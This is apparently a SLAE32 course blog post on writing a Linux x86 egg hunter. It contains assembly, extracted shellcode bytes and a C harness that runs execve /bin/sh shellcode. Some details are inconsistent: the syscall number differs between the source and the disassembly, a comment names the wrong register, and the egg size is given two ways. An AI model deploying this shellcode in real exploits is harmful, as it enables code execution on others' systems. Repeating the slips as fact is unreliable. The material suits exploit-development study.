---
layout: single
title: 'SLAE32 - Assignment #3 - Egg Hunter'
date: 2020-06-16
classes: wide
header:
  teaser: /assets/images/SLAE32/SLAE32.jpg
tags:
  - SLAE
  - Linux
  - x86
  - Shellcoding
  - Egghunter
--- 
![](/assets/images/SLAE32/SLAE32.jpg)


## SLAE32 Assignment #3 – Egg Hunter

<h2><span style="color:#339966;"><strong>Student ID : SLAE &nbsp;– 1314</strong></span></h2>
<h2><span style="color:#339966;"><strong>Assignment 3 :</strong></span></h2>
<p style="text-align:justify;">In this assignment a working demo of the EggHunter <em>shellcode</em> will be shown in practice. Specifically the goal of this assignment is the following</p>

<ul>
 	<li><strong>Study about the Egg Hunter shellcode </strong></li>
 	<li><strong>Create a working demo of&nbsp; the Egg Hunter </strong></li>
 	<li><strong>The Egg Hunter should be configurable for different payloads</strong></li>
</ul>
<blockquote class=""><em>Disclaimer</em> :

<em>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification</em></blockquote>
<blockquote class="">The full source code and scripts can be found at <a href="https://github.com/xvass/SLAE/tree/master/Assignment3">github</a></blockquote>
<h3><span style="color:#339966;">Egg Hunters Theory&nbsp;</span></h3>
<p style="text-align:justify;">In classic stack based buffer overflow, the buffer size is big enough to hold the <em>shellcode</em>, but in cases where the buffer length is bigger than the available buffer size then the <em>shellcode</em> will not fit into the available memory region and eventually it will crash on execution. For that reason, one solution is to use <em>egghunters</em>. In more detail, <em>egghunting</em> is a useful exploitation technique implemented to overcome the deficiency of a small buffer that cannot hold a <em>shellcode</em> that is bigger than the small available memory region. In addition to this, it might be possible to access a larger buffer somewhere else in memory. Doing so, a<span style="text-decoration:underline;"> tag of 4 bytes will be prepended at the <em>shellcode</em> and placed inside the larger buffer</span>. To this end, the small available memory region will contain a jump instruction to the <em>egghunter</em>. Then the <em>egghunter</em> will search the stack or the heap for two consecutive tags to find the <em>shellcode,</em> and in case the <em>shellcode</em> is found, then it will be executed. Essentially, egghunter is a piece of code that searches through the VAS ( Virtual Address Space ) looking for a token specified by the writer of the <em>egghunter</em>.</p>

<h3><span style="color:#339966;"><strong>Virtual Address Space</strong>&nbsp;</span></h3>
<p style="text-align:justify;">According to wikipedia, the range of virtual addresses usually starts at a low address and can extend to the highest address allowed by the computer's instruction set architecture and supported by the operating system's pointer size implementation, which can be 4 bytes for 32-bit. One important thing this implementation achieves, is that it provides security through process isolation assuming each process is given a separate address space.</p>
<p style="text-align:justify;">The address space at IA32 can have the smallest granular unit of memory which is <em>4096</em> bytes of page size. The following C program will show the page size used by the operating system</p>

```c
#include <stdio.h>
#include <unistd.h>

int main (void)
{
printf ("the page size is %ld bytes. \n", sysconf(_SC_PAGESIZE));
return 0;
}
```

After compiling and executing the program the results will be as follows

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
root@kali:~/Documents# gcc -o pagesize pagesize.c
root@kali:~/Documents# ./pagesize
the page size is 4096 bytes.
</pre>

<p style="text-align:justify;">Furthermore, aligning a page on a page-sized boundary (e.g. 4096 bytes) allows the&nbsp; hardware to map a virtual address to a physical address by substituting the higher bits in the address, rather doing complex arithmetic.</p>

<h3><span style="color:#339966;">The EggHunting approach&nbsp;</span></h3>
<p style="text-align:justify;">In this case scenario we will build an Assembly program that will use a system call in order to search for the EGG in every available memory page on the system. If the program accesses an invalid memory page then an EFAULT error will be triggered&nbsp; and the program will skip to the next page. Also, if the next page is valid but the EGG is not found then the program will go to the next page and so on until the EGG will be found in memory.</p>
As Skape mentioned to his <a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf">paper</a> the Egghunter must satisfy the following requirements
<ol>
 	<li>It must be robust</li>
 	<li>It must be small</li>
 	<li>it must be fast</li>
</ol>
<p style="text-align:justify;">Having in mind the above requirements and according to skape <a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf">paper</a>, abusing the syscalls seems to be a more elegant and less intrusive method to obtain our purpose.</p>
<p style="text-align:justify;">As skape states :</p>
<p style="text-align:justify;"><span style="color:#3366ff;"><em>" The first and most obvious approach would be to register a SIGSEGV handler to catch invalid memory address dereferences and prevent the program from crashing. The second technique that can be used involves abusing the system call interface provided by the operating system to validate process VMAs in kernel mode. This approach offers a fair bit of elegance in that there are a wide array of system calls to choose from that might better suit the need of the searcher, and, furthermore, is less intrusive to the program itself than would be installing a segmentation fault signal handler "&nbsp;</em></span></p>
<p style="text-align:justify;">Also the following statement from Skape's paper says that using a system call could provide us with everything we need to implement our Egghunter</p>
<span style="color:#3366ff;"><em>" When a system call encounters an invalid memory address, most will return the EFAULT error code to indicate that a pointer provided to the system call was not valid. Fortunately for the egg hunter, this is the exact type of information it needs in order to safely traverse the process’ VAS without dereferencing the invalid memory regions that are strewn about the process "</em></span>
<h3><span style="color:#339966;">The mkdir System call</span></h3>
<p style="text-align:justify;">The above important statements are leading us to choose from a variety of system calls but in this case we will choose the <em>mkdir(2)</em> system call in order to build our <strong>Egghunter</strong>.</p>
<p style="text-align:justify;">According to <em>mkdir(2)</em> <a href="https://linux.die.net/man/2/mkdir" target="_blank" rel="noopener">man</a> page, the purpose of this system call is to create a new directory. Also as we can see in the man page of <em>mkdir(2)</em> syscall, the <strong>EFAULT</strong> error is supported.</p>
<p style="text-align:justify;">According to Skape's paper, there are two reasons of choosing a<em>&nbsp;</em>system call :</p>
<p style="text-align:justify;"><em><span style="color:#00ff00;"><span style="color:#3366ff;">" 1.&nbsp;</span></span><span style="color:#3366ff;"> First, the system call had to have a pointer for just one argument, as multiple pointer arguments would require more register initialisation, and thus violate requirement #2 regarding size. </span></em></p>
<p style="text-align:justify;"><span style="color:#3366ff;"><em>2.&nbsp; Secondly, the system call <strong>had to not attempt to write to the pointer supplied</strong>, as it could lead to bad things happening if the memory were indeed writable, which in all likelihood would be the case for the buffer that would hold the egg being searched for. "</em></span></p>
<em>mkdir(2)</em> prototype :

```c
#include <sys/stat.h>
#include <sys/types.h>

int mkdir(const char *pathname, mode_t mode);
```

<h3><span style="color:#33cccc;"><span style="color:#339966;">The Egg Hunter</span> <span style="color:#339966;">Implementation</span></span></h3>
The steps to build the <strong>Egghunter</strong> will be the following
<ol>
 	<li style="text-align:justify;">Use an EGG of 8 bytes and store it in register.</li>
 	<li style="text-align:justify;">Execute the syscall</li>
 	<li style="text-align:justify;">compare the return code with -14 (EFAULT which is 0xf2 in hex)</li>
 	<li style="text-align:justify;">if the comparison doesn't match go to the next page and continue from point 2</li>
 	<li style="text-align:justify;">if the comparison matches (ZF=0) the EGG is found</li>
 	<li style="text-align:justify;">execute the shellcode</li>
</ol>
<p style="text-align:justify;">At the first point above the 8 bytes word EGG is a 4 bytes string repeated 2 times and stored somewhere in memory. The reason of using a 4 bytes string repeated 2 times is because we must save the search pattern in one of the CPU registers and to avoid the case where the search of the EGG encounters the pattern itself instead of the Egghunter stored in the buffer.</p>
<p style="text-align:justify;">The pathname pointer argument at the <em>mkdir(2)</em> system call will be abused by loading the memory address to be compared in order to find a valid memory page. If there is a valid memory page and no <strong>EFAULT</strong> returned, then the memory page will be checked for the egg<strong> 0x50905090</strong> tag.</p>

<h3><span style="color:#339966;">Analysis and Implementation&nbsp;</span></h3>
<p style="text-align:justify;">First the following three instructions will be used to initialise registers. The <strong>ebx</strong> contains the four byte version of the egg tag that is searched, which, in this case is <strong>0x50905090. </strong>Then the <strong>ecx </strong>register will be zeroed out using <strong>xor</strong> instruction as well the <strong>edx</strong> and <strong>eax</strong> using <strong>mul</strong> instruction.</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
_start:  
mov ebx, 0x50905090    ; Store EGG in EDX 
xor ecx, ecx           ; Zero out ECX  
mul ecx                ; Zero out EAX and EDX
</pre>

<p style="text-align:justify;">Next, the <strong>dx</strong> register will be used to perform memory alignment while taking into consideration the smallest granular unit of memory on <em>IA32</em> which is <em>PAGE_SIZE</em> with the size of <strong>4096</strong> bytes. The memory alignment must be performed in case an invalid memory address might returned from the <em>mkdir(2)</em> syscall, where in such case all addresses in the memory page will also be invalid. So, in order to avoid shellcode from breaking because of the existence of null bytes in case of the hex representation of <strong>4096</strong> bytes (<strong>0x1000</strong>), the following technique will be followed</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
npage:                    
or dx, 0xfff    ; Align a region of memory
</pre>

<p style="text-align:justify;">Next, <strong>pushad</strong> instruction will push all general registers into the stack in order to preserve values to be used with <em>mkdir(2)</em> syscall. Later on, the <strong>ebx</strong> register will hold the address <strong>[edx+4]</strong> and then the lower byte register <strong>al</strong> will be assigned with the immediate value <b>0x0c </b>which represents the <em>mkdir(2)</em> syscall. After that, the <strong>int 0x80</strong> instruction will call <em>mkdir(2)</em>&nbsp;syscall. Later on, the return value from <em>mkdir(2)</em>&nbsp;syscall will be compared with the hex value <strong>0xf2</strong> which represents the <strong>EFAULT</strong> errno value.</p>


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
naddr:
inc edx                 ; increase EDX to achieve 4096 bytes page (4KiB)                                   
pushad                  ; push the general purpose values into the stack
lea ebx, [edx+4]        ; put address [edx+4] to ebx
mov al, 0x4e            ; syscall for mkdir() to lower byte register al 
int 0x80                ; call mkdir()  
cmp al, 0xf2            ; 0xf2 is 242 in decimal - check for EFAULT (errno code 256-242 = 14 - bad file address)
</pre>

<p style="text-align:justify;">Then all the registers will restore their values by using <strong>popad</strong> instruction. In case the <em>mkdir(2)</em> syscall doesn't return <strong>EFAULT</strong>, then the value stored in <strong>ebx</strong>&nbsp;will be compared with the value contained in <strong>[edx]</strong> address in order to check if the egg<strong> 0x50905090</strong>&nbsp;tag is located inside this address. Otherwise, in case the <em>mkdir(2)</em> syscall returns <strong>EFAULT</strong>, then the memory address space will be indicated as invalid and the search will be forwarded to the next page. Also in case the first comparison is successful, meaning the egg<strong> 0x50905090 </strong>tag is found, the next<em> four(4)</em> bytes will also be checked in order to find out if the second egg<strong> 0x50905090</strong>&nbsp;tag is also assigned. Furthermore, if the egg<strong> 0x50905090</strong>&nbsp;tag is not assigned to the address <strong>[edx+4], </strong>the next address will also be checked, otherwise <strong>[edx]</strong> and <strong>[edx+4]</strong> will contain the egg tag.</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
popad            ; restore the general purpose registers 
jz npage         ; if mkdir() returned EFAULT, go to the next page 
cmp [edx], ebx   ; check if egg 0x50905090 tag is in [edx] address
jnz  naddr       ; if ZF=0 then it doesnt match so it goes to the next page
cmp [edx+4], ebx ; also check if EGG second tag is found in [edx+4] 
jne naddr        ; If egg (0x50905090) tag not found then visit next address 
jmp edx          ; [edx] and [edx+4] contain the second egg (0x50905090)
</pre>

Now lets proceed further and test the hunter. First, the program will be compiled using the following commands

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
root@kali:~/Documents/SLAE/Assignment3# nasm -f elf -o egg.o egg.nasm
root@kali:~/Documents/SLAE/Assignment3# ld -z execstack -o egg egg.o
</pre>

Then the opcodes will be checked if null bytes exist using&nbsp;<strong>objdump</strong>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
root@kali:~/Documents/SLAE/Assignment3# objdump -M intel -D egg

egg:     file format elf32-i386


Disassembly of section .text:

08049000 &#x3c;_start>:
 8049000:   bb 90 50 90 50          mov    ebx,0x50905090
 8049005:   31 c9                   xor    ecx,ecx
 8049007:   f7 e1                   mul    ecx

08049009 &#x3c;npage >:
 8049009:   66 81 ca ff 0f          or     dx,0xfff

0804900e &#x3c;naddr >:
 804900e:   42                      inc    edx
 804900f:   60                      pusha
 8049010:   8d 5a 04                lea    ebx,[edx+0x4]
 8049013:   b0 0c                   mov    al,0xc
 8049015:   cd 80                   int    0x80
 8049017:   3c f2                   cmp    al,0xf2
 8049019:   61                      popa
 804901a:   74 ed                   je     8049009 &#x3c;npage>
 804901c:   39 1a                   cmp    DWORD PTR [edx],ebx
 804901e:   75 ee                   jne    804900e &#x3c;naddr>
 8049020:   39 5a 04                cmp    DWORD PTR [edx+0x4],ebx
 8049023:   75 e9                   jne    804900e &#x3c;naddr>
 8049025:   ff e2                   jmp    edx
</pre>

Then the <em>shellcode&nbsp;</em>will be produced using <strong>objdump</strong>&nbsp;as follows

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
root@kali:~/Documents/SLAE/Assignment3# objdump -d ./egg|grep '[0-9a-f]:'|grep -v 
'file'|cut -f2 -d:|cut -f1-5 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 
's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\xbb\x90\x50\x90\x50\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0
\x0c\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2"
</pre>

The following program will be used for the execution of the Egghunter

```c
#include <stdio.h>
#include <string.h>

#define EGG "\x90\x50\x90\x50"

unsigned char egghunter[] = \
"\xbb"
EGG
"\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x0c\xcd\x80\x3c\xf2
\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2";

// execve stack shellcode /bin/sh
unsigned char shellcode[] = \
EGG
EGG
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53
\x89\xe1\xb0\x0b\xcd\x80";

int main()
{
        printf("Shellcode Length:  %d\n", strlen(shellcode));
        int (*ret)() = (int(*)()) egghunter;
        ret();
}
```

if we compile and run the code above we will have a our&nbsp; execve shellcode executed


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
root@kali:~/Documents/SLAE/Assignment3# gcc -fno-stack-protector -g -z execstack -m32 -o shell shell.c ./shell
Shellcode Length: 33
#
</pre>

